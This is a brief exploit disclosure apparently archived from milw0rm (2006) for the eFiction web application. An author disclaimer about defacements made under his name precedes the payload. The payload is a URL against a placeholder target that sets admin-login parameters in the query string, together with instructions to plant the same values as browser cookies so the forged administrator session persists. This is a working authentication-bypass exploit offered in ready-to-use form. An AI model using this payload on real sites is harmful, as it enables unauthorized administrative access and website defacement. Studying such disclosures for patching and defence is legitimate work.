Someone is also illegally defacing \r\nthese websites under MY name, which is a shame because they ripped it from a private discussion \r\non g00ns.net. This proof of concept is not to be used to illegally hack websites. I do not condone, \r\nnor act in this type of activity. I suggest whomever is defacing websites under my name stop, \r\nsince you would gain more notorioty under your own name.\r\n##########################################\r\n\r\nhttp://[target].com/efiction/index.php?adminloggedin=1&loggedin=1&level=1\r\n\r\nUse firefox's extension \"add n edit cookies\" to add these to your cookies so they stick. \r\n(ie: instead of $_GET['loggedin'] its $_COOKIE['loggedin'] which stays with each page)\r\n\r\n# milw0rm.com [2006-08-25]",
